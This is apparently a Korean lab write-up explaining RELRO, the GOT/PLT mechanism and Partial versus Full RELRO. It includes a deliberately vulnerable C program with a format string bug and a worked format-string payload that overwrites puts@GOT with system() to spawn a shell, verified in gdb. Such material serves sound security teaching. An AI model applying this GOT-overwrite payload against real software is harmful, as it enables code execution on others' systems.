# RELRO (Relocation Read-Only)

**RELRO**는 **GOT(Global Offset Table)** 을 보호하는 보호기법이다. </br>
이 파트에서는 링커와 relocation에 대해 알아보고, RELRO가 어떻게 GOT overwrite와 같은 공격을 방어하는지 알아본다.

---

## 1. 등장 배경

### 1.1 GOT overwrite

동적 링크 프로그램에서는 외부 함수의 실제 주소가 Global Offset Table(GOT)에 저장된다.

이 GOT는 실행 중 주소를 갱신하게 위해 쓰기 가능한 상태로 존재한다.

따라서 공격자가 메모리 쓰기 취약점을 이용해 GOT 엔트리를 덮어쓰면, 프로그램의 함수 호출 흐름을 원하는 방향으로 변경할 수 있다. 

예를 들어 아래와 같은 프로그램에서 `printf()`의 주소를 `system()` 으로 덮어씌운다면, 쉘을 실행할 수 있게 된다.

``` c
#include <stdio.h>

int main(){
  printf("/bin/sh");
}
```

### 1.2 RELRO가 막는 것

RELRO는 GOT overwrite 공격을 어렵게 하기 위한 보호기법이다.

링커는 ELF에 RELRO 정보를 기록하고, 프로그램 실행 시 로더는 relocation이 완료된 GOT 영역을 읽기 전용으로 변경한다.

그 결과 공격자는 GOT 엔트리를 덮어써 함수 호출 흐름을 변경할 수 없게 된다.

---

## 2. PLT와 GOT


라이브러리를 사용하는 방식은 크게 정적 링크(Static Linking)와 동적 링크(Dynamic Linking)로 나뉜다.

* 정적 링크: 필요한 라이브러리 코드를 실행 파일에 포함하는 방식이며,</br>
* 동적 링크: 실행 중 공유 라이브러리의 함수를 연결하여 사용하는 방식이다.

PLT와 GOT는 동적 링크를 지원하기 위해 사용되는 구조이다.

### 2.1 PLT

PLT(Procedure Linkage Table)는 동적 라이브러리의 함수를 호출하기 위한 **코드 영역**이다.

프로그램에서 외부 함수를 호출하면, 직접 libc의 함수를 호출하는 것이 아니라 먼저 PLT를 거쳐 호출된다.

PLT는 GOT에 저장된 함수 주소를 참조하며, 필요한 경우 동적 로더(ld-linux)에 실제 주소의 탐색을 요청하는 역할을 한다.

### 2.2 GOT

GOT(Global Offset Table)는 동적 라이브러리 함수의 실제 주소를 저장하는 **테이블**이다.

동적 링크 프로그램에서는 컴파일 시점에 외부 함수의 실제 주소를 알 수 없으므로,</br>
실행 중 결정된 함수 주소를 GOT에 기록하여 사용한다.

### 2.3 PLT와 GOT의 관계

외부 함수를 호출하면 다음과 같은 과정을 거치게 된다.

```
printf()
    ↓
printf@plt
    ↓
printf@got
    │
    ├── 주소 있음 ─────────→ libc printf
    │
    └── 주소 없음
            ↓
        ld-linux
            ↓
      GOT 갱신 후
            ↓
       libc printf
```

#### 1) GOT에 주소가 있는 경우

1. PLT: GOT를 확인한다.
2. PLT: 주소가 있으면 GOT 주소로 점프한다.

#### 2) GOT에 주소가 없는 경우

1. PLT: GOT를 확인한다.
2. PLT: 주소가 없으면 ld-linux(동적 로더)를 호출한다.
4. ld-linux: 실제 주소를 탐색, GOT를 갱신한다.
5. PLT: 갱신된 GOT 주소로 점프한다.

| 구성 요소                                | 역할                                    |
| ------------------------------------ | ------------------------------------- |
| **PLT**                              | 함수 호출 진입점. GOT를 참조하고 필요하면 ld-linux 호출 |
| **ld-linux (`_dl_runtime_resolve`)** | 실제 함수 주소 탐색, GOT 갱신                   |
| **GOT**                              | 실제 함수 주소 저장                           |
| **PLT (복귀 후)**                       | GOT에 저장된 주소로 점프                       |

즉, PLT는 코드, GOT는 데이터.

---

## 3. Relocation의 방식

동적 링크 프로그램은 컴파일 시점에 외부 함수의 실제 주소를 알 수 없다.

따라서 프로그램이 실행되면 동적 로더(ld-linux)가 실제 함수의 주소를 찾아 GOT에 기록하는 과정을 수행한다.

이 과정을 **Relocation**이라고 하며, 주소를 기록하는 시점에 따라 eager binding과 lazy binding으로 나뉜다.

### 3.1 Eager Binding

Eager Binding은 프로그램이 시작될 때 필요한 모든 외부 함수의 주소를 한 번에 결정하는 방식이다.

프로그램 실행 전에 모든 relocation이 완료되므로, 실행 중에는 GOT를 더 이상 수정할 필요가 없다.

### 3.2 Lazy Binding

Lazy Binding은 외부 함수가 처음 호출되는 시점에 해당 함수의 주소를 결정하는 방식이다.

처음 호출될 때 동적 로더가 함수의 실제 주소를 찾아 GOT를 갱신하며, 이후에는 GOT에 저장된 주소를 사용하여 바로 함수를 호출한다.

필요한 함수만 relocation을 수행하므로 프로그램의 초기 실행 시간을 줄일 수 있다.

---

## 4. RELRO의 동작 방식

RELRO는 하나의 구성 요소만으로 동작하는 보호기법이 아니다.

ELF 생성 시점에는 링커가 RELRO 적용에 필요한 정보를 ELF에 기록하고,</br>
ELF 실행 시점에는 동적 로더가 그 정보를 읽어 실제 메모리 권한을 변경한다.

즉, RELRO의 동작은 크게 다음 두 단계로 나눌 수 있다.

1. ELF 생성 시점: 링커가 RELRO 영역을 지정
2. ELF 실행 시점: 로더가 RELRO 영역을 읽기 전용으로 변경

### 4.1 ELF 생성 시점

RELRO는 ELF를 생성하는 과정에서 링커에 의해 준비된다.

프로그램이 컴파일되면 `.o` 파일이 생성되고,</br>
이후 링커(ld)가 `.o` 파일과 필요한 라이브러리를 연결하여 최종 ELF를 생성한다.

이 과정에서 RELRO는 다음과 같은 순서로 반영된다.


#### 1) 링커 옵션 전달

RELRO는 링커 옵션을 통해 설정된다.

예를 들어,

```id="3w74n6"
-Wl,-z,relro
```

에서 `-Wl`은 gcc가 해당 옵션을 링커에게 전달하라는 의미이다.

즉, RELRO는 컴파일러가 직접 구현하는 보호기법이 아니라,</br>
링커가 ELF를 생성하는 과정에서 반영하는 보호기법이다.


#### 2) ELF 구성 요소 생성

링커는 `.o` 파일과 라이브러리를 연결하면서

* GOT
* PLT
* Relocation 정보

등 실행에 필요한 구조를 ELF에 생성한다.


#### 3) `PT_GNU_RELRO` 생성

RELRO가 활성화되어 있으면, 링커는 ELF의 Program Header에 `PT_GNU_RELRO`를 생성한다.

`PT_GNU_RELRO`는 실행 후 읽기 전용(Read-Only)으로 변경해야 하는 메모리 영역을 나타내는 Program Header이다.

즉, 링커는 메모리 권한을 직접 변경하는 것이 아니라,</br>
ELF 안에 "이 영역은 실행 시 보호해야 한다."는 정보를 기록한다.


#### 4) ELF 생성 완료

이 과정을 거쳐 RELRO 정보가 포함된 ELF가 완성된다.

정리하면 ELF 생성 시점에서 링커가 수행하는 작업은 다음과 같다.

```
링커(ld)
 ├─ GOT 생성
 ├─ PLT 생성
 ├─ Relocation 정보 생성
 ├─ PT_GNU_RELRO 생성
 └─ ELF 완성
```

### 4.2 ELF 실행 시점

프로그램이 실행되면 RELRO는 다음과 같은 순서로 적용된다.

#### 1) 커널이 ELF를 메모리에 로드

프로그램이 실행되면 커널은 ELF Header와 Program Header를 읽고,
`PT_LOAD` 세그먼트를 메모리에 매핑한다.

또한 `PT_INTERP`를 확인하여 동적 로더(`ld-linux`)를 실행한다.

즉, 이 단계에서는 프로그램이 실행될 수 있는 메모리 공간이 준비된다.


#### 2) 동적 로더가 ELF를 해석

동적 링크 프로그램의 경우,
이후 동적 로더(`ld-linux`)가 실행에 필요한 추가 작업을 수행한다.

이때 로더는 ELF에 기록된 다음과 같은 정보를 읽는다.

* `PT_DYNAMIC`
* `DT_NEEDED`
* `PT_GNU_RELRO`

하지만 아직 RELRO를 적용하지는 않는다.
먼저 relocation을 수행해야 하기 때문이다.


#### 3) Relocation 수행

동적 링크 프로그램에서는 외부 함수의 실제 주소가 실행 시점에 결정된다.

따라서 로더는 공유 라이브러리에서 실제 함수의 주소를 찾고,
그 주소를 GOT에 기록한다.

예를 들어 다음과 같은 작업이 수행된다.

```
printf@GOT = 실제 printf 주소
puts@GOT   = 실제 puts 주소
read@GOT   = 실제 read 주소
```

이 과정에서는 GOT를 수정해야 하므로,
해당 영역은 아직 writable 상태를 유지해야 한다.


#### 4) RELRO 적용

모든 relocation이 끝나면
로더는 `PT_GNU_RELRO`에 기록된 메모리 영역을 읽기 전용(Read-Only)으로 변경한다.

대략 다음과 같은 시스템 콜이 수행된다.

```c
mprotect(relro_start, relro_size, PROT_READ);
```

그 결과 메모리 권한은

```
rw-  →  r--
```

로 변경된다.

즉, relocation이 끝난 이후에는 더 이상 수정할 필요가 없는 영역을 읽기 전용으로 만들어,
GOT overwrite를 어렵게 한다.

### 4.3 정리

RELRO의 전체 동작 흐름은 다음과 같다.

```
컴파일
    ↓
컴파일러
    ↓
.o 생성
    ↓
링커(ld)
    ├─ GOT 생성
    ├─ PLT 생성
    ├─ PT_GNU_RELRO 생성
    └─ ELF 완성
    ↓
프로그램 실행
    ↓
커널
    └─ ELF를 메모리에 매핑
    ↓
ld-linux
    ├─ PT_GNU_RELRO 확인
    ├─ relocation 수행
    ├─ lazy / eager binding 처리
    └─ mprotect()로 RELRO 영역을 Read-Only 변경
```

핵심은 다음과 같다:

링커는 보호할 영역을 ELF에 기록하고, 로더는 실행 시점에 그 영역을 실제로 read-only로 변경한다.

따라서 RELRO는 링커와 로더가 함께 동작하여 구현되는 보호기법이다.

---

## 5. RELRO의 종류

Partial RELRO와 Full RELRO의 가장 큰 차이는 `.got.plt`를 읽기 전용으로 변경할 수 있는지 여부이다.

### 5.1 Partial RELRO

Partial RELRO는 기본적인 RELRO 보호를 제공하는 방식이다.

이 방식에서는 `PT_GNU_RELRO` 영역이 읽기 전용으로 변경되지만,</br>
lazy binding을 사용하기 때문에 `.got.plt`는 계속 쓰기 가능한 상태를 유지한다.

이는 실행 중에도 새로운 외부 함수의 주소를 GOT에 기록해야 하기 때문이다.

따라서 `.got.plt`를 대상으로 하는 GOT overwrite 공격은 여전히 가능하다.

### 5.2 Full RELRO

Full RELRO는 가장 강력한 형태의 RELRO이다.

Full RELRO는 `-z now`를 함께 사용하여 프로그램 시작 시 모든 relocation을 완료한다.

따라서 실행 중에는 GOT를 수정할 필요가 없으므로,</br>
`.got.plt`를 포함한 RELRO 영역 전체를 읽기 전용으로 변경할 수 있다.

그 결과 GOT overwrite 공격을 효과적으로 차단할 수 있다.

### 5.3 정리

| 항목          | Partial RELRO | Full RELRO       |
| ------------- | ------------- | ---------------- |
| Binding       | Lazy          | Eager (`-z now`) |
| `.got.plt`    | Writable      | Read-Only        |
| GOT overwrite | 가능          | 불가능           |

---

## 6. 실습 구성

이번 실습에서는 간단한 FSB 취약점이 존재하는 소스코드를 
Partial/Full RELRO의 2가지 버전으로 빌드하여 동작을 비교한다. 

두 바이너리에 GOT overwrite 기법을 사용한 동일 페이로드를 사용하여 
왜 공격이 성공 혹은 실패하는지 확인하는 것을 목표로 한다.

### 6.1 취약 코드

``` c
// filename: sample.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buf[128];

    setvbuf(stdout, NULL, _IONBF, 0);
    setregid(getegid(), getegid());

    puts("input:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);

    puts("/bin/sh");

    return 0;
}
```

#### 코드 특징

* `printf(buf)`: Format String Bug
* `puts("/bin/sh")`: `puts()` 대신 `system()` 이 호출되도록 하면 쉘 획득 가능

### 6.2 컴파일 옵션

#### 1) Partial RELRO

| 옵션 | 목적 |
| --- | --- |
| `-Wl,-z,lazy` | lazy binding |

#### 2) Full RELRO

| 옵션 | 목적 |
| --- | --- |
| `-Wl,-z,now` | eager binding |

#### 3) 공통

* `-m32`
* `-O0`
* `-fno-omit-frame-pointer`
* `-z noexecstack` : NX on
* `-fno-stack-protector` : Canary off
* `-fno-pie` / `-no-pie` : PIE off
* `-Wl,-z,relro` : ELF에 `PT_GNU_RELRO` 생성
---

## 7. RELRO 적용 범위 비교

### 7.1 Partial RELRO

#### Program Header

`PT_GNU_RELRO` 적용 범위를 확인한다.

```
$ readelf -l /tmp/relro-lab/relro-partial | grep GNU_RELRO
  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1
```

0x0804bf00 ~ 0x0804c000에 RELRO를 적용함을 알 수 있다. </br>
이 부분이 실행 후 read-only로 변경되어 보호받을 수 있다.

#### Section Header

`.got`와 `.got.plt` 섹션이 RELRO 적용 범위에 포함되는지 확인한다.

```
$ readelf -S /tmp/relro-lab/relro-partial | egrep ".got|.got.plt"
  [21] .got              PROGBITS        0804bff0 002ff0 000004 04  WA  0   0  4
  [22] .got.plt          PROGBITS        0804bff4 002ff4 000028 04  WA  0   0  4
```

* `.got` 범위: 0x0804bff0 ~ 0x0804bff3
* `.got.plt` 범위: 0x0804bff4 ~ 0x0804c01b

`.got.plt` 일부는 RELRO 적용을 받지 못하는 범위에 있다.

### 7.2 Full RELRO

#### Program Header

```
$ readelf -l /tmp/relro-lab/relro-full | grep GNU_RELRO
  GNU_RELRO      0x002ed4 0x0804bed4 0x0804bed4 0x0012c 0x0012c R   0x1
```

0x0804bed4 ~ 0x0804c000에 RELRO가 적용됨을 알 수 있다.

#### Section Header

```
$ readelf -S /tmp/relro-lab/relro-full | egrep ".got|.got.plt"
  [21] .got              PROGBITS        0804bfd4 002fd4 00002c 04  WA  0   0  4
```

`.got.plt`가 따로 보이지 않고 `.got`에 합쳐진 형태로 배치됐다. </br>
Full RELRO에서는 실행 후 GOT 엔트리를 수정할 일이 없으니 굳이 따로 배치하지 않을 수 있다.

* `.got` 범위: 0x0804bfd4 ~ 0x0804c000

따라서 `.got` 전체가 RELRO 범위에 들어감을 알 수 있다. 

---

## 8. Partial RELRO

### 8.1 주소 확인

puts@GOT: 0804c010
```
$ objdump -R /tmp/relro-lab/relro-partial | grep puts
0804c010 R_386_JUMP_SLOT puts@GLIBC_2.0
```

system offset: 00050430
```
$ readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep " system@@"
1147: 00050430 63 FUNC WEAK DEFAULT 15 system@@GLIBC_2.0
```

libc base: 0xf7d95000 - 0x23000 = 0xf7d72000
```
(gdb) info proc mappings
process 6139
Mapped address spaces:
  Start Addr End Addr   Size     Offset   Perms objfile
  0xf7d95000 0xf7f1c000 0x187000 0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
  0xf7f1c000 0xf7fa1000 0x85000  0x1aa000 r--p   /usr/lib/i386-linux-gnu/libc.so.6
  0xf7fa1000 0xf7fa3000 0x2000   0x22f000 r--p   /usr/lib/i386-linux-gnu/libc.so.6
  0xf7fa3000 0xf7fa4000 0x1000   0x231000 rw-p   /usr/lib/i386-linux-gnu/libc.so.6
```

### 8.2 FSB offset 확인

```
$ /tmp/relro-lab/relro-partial
input:
AAAA.%x.%x.%x.%x.%x
AAAA.80.f7fa35c0.80491e8.41414141.2e78252e
/bin/sh
```

4번째 인자로 AAAA가 출력됨 → buf가 4번째 인자 위치에 있음

offset = 4

### 8.3 payload 구성

2바이트씩 쪼개넣기

```
[주소1][주소2][출력 길이 조절][%4$hn][출력 길이 조절][%5$hn]
```

현재 값:
* puts@GOT   = 0x0804c010
* system     = 0xf7dc2430
* FSB offset = 4

목표: 
```
0x0804c010: 0xf7dc2430
```

최종 페이로드 구조:
```
[p32(puts@GOT)]
[p32(puts@GOT+2)]
%9256c
%4$hn
%54188c
%5$hn
```

### 8.4 watchpoint로 GOT 변경 확인

```
Hardware watchpoint 2: *(int*)0x0804c010

Old value = -136436688
New value = -136567760
0xf7dd22e0 in printf_positional (buf=buf@entry=0xffffcd40, 
    format=format@entry=0xffffce30 "\020\300\004\b\022\300\004\b%9256c%4$hn%54188c%5$hn", 
    readonly_format=readonly_format@entry=0, ap=<optimized out>, 
    ap_savep=<optimized out>, nspecs_done=3, lead_str_end=<optimized out>, 
    work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, 
    thousands_sep=<optimized out>, mode_flags=<optimized out>)
    at ./stdio-common/vfprintf-process-arg.c:350
350	in ./stdio-common/vfprintf-process-arg.c
```

`puts@GOT`에 watchpoint를 설정한 결과, `printf(buf)` 처리 중 GOT 엔트리 값이 변경되는 것을 확인했다.

### 8.5 `puts@plt` → `system` 이동 확인

```
(gdb) c
Continuing.
                                                                                           �
Breakpoint 1, 0x0804923c in main ()
(gdb) si
0x08049070 in puts@plt ()
(gdb) si
__libc_system (line=0x804a00f "/bin/sh") at ../sysdeps/posix/system.c:202
warning: 202	../sysdeps/posix/system.c: No such file or directory
```

이후 `puts("/bin/sh")` 호출 시 `puts@plt`를 거쳐, 
실제 `puts()`가 아니라 `__libc_system("/bin/sh")`로 제어가 이동했다.

Partial RELRO 상태에서는 `.got.plt`가 writable이므로, 
GOT overwrite를 통해 함수 호출 흐름을 변경할 수 있음을 확인했다.

---

## 9. Full RELRO

### 9.1 주소 확인

바이너리 내의 plt@got의 주소가 달라졌을 수 있으니 이 부분만 새로 확인했다.

puts@GOT: 0804bff0
```
$ objdump -R /tmp/relro-lab/relro-full | grep puts
0804bff0 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

### 9.2 동일 페이로드 비교

#### `printf(buf)` 진입 전
``` gdb
(gdb) c
Continuing.
input:

Breakpoint 1, 0x0804922c in main ()
(gdb) x/wx 0x0804bff0
0x804bff0 <puts@got.plt>:	0xf7dea140
```

#### `printf(buf)` 진입 후

```
(gdb) ni

...
                 
Program received signal SIGSEGV, Segmentation fault.
0xf7dd22dd in printf_positional (buf=buf@entry=0xffffcd40, 
    format=format@entry=0xffffce30 "\360\277\004\b\362\277\004\b%9256c%4$hn%54188c%5$hn", 
    readonly_format=readonly_format@entry=0, ap=<optimized out>, 
    ap_savep=<optimized out>, nspecs_done=1, lead_str_end=<optimized out>, 
    work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, 
    thousands_sep=<optimized out>, mode_flags=<optimized out>)
    at ./stdio-common/vfprintf-process-arg.c:350
warning: 350	./stdio-common/vfprintf-process-arg.c: No such file or directory
```

Full RELRO 바이너리에 동일한 payload를 입력하면,
`printf(buf)` 내부에서 `%hn`을 처리하며 `puts@GOT`에 쓰기를 시도한다.

하지만 Full RELRO에서는 relocation 완료 후 GOT 영역이 read-only로 변경되므로, 쓰기 시도 시 SIGSEGV가 발생한다.

```
(gdb) x/wx 0x0804bff0
0x804bff0 <puts@got.plt>:	0xf7dea140
```

`puts@GOT` 값을 확인하면, 실행 전후 모두 동일한 값으로 유지됨을 확인할 수 있다.

따라서 Full RELRO 상태에서는 GOT overwrite가 차단됨을 확인할 수 있다.

---

## 10. 정리

| 항목               | Partial RELRO | Full RELRO               |
| ---------------- | ------------- | ------------------------ |
| Binding 방식       | Lazy Binding  | Eager Binding (`-z now`) |
| Relocation 수행 시점 | 함수가 처음 호출될 때  | 프로그램 시작 시                |
| `.got.plt`       | Writable      | Read-Only                |
| GOT 수정           | 가능            | 불가능                      |
| GOT overwrite    | 가능            | 불가능                      |
| 공격 결과            | 제어 흐름 변경 가능   | SIGSEGV 발생               |

이번 실습에서는 동일한 FSB 취약점과 동일한 payload를 사용하여 두 바이너리를 비교하였다.

Partial RELRO에서는 `puts@GOT`를 `system()`으로 덮어써 `puts("/bin/sh")` 호출이 `system("/bin/sh")`으로 변경되었다.

반면 Full RELRO에서는 relocation이 완료된 뒤 GOT가 읽기 전용으로 변경되므로, 동일한 payload로 GOT에 쓰기를 시도하는 순간 SIGSEGV가 발생하였다.

즉, Partial RELRO와 Full RELRO의 차이는 **GOT를 실행 중에도 수정해야 하는지 여부**이며, Full RELRO는 이를 이용한 GOT overwrite 공격을 효과적으로 차단한다.
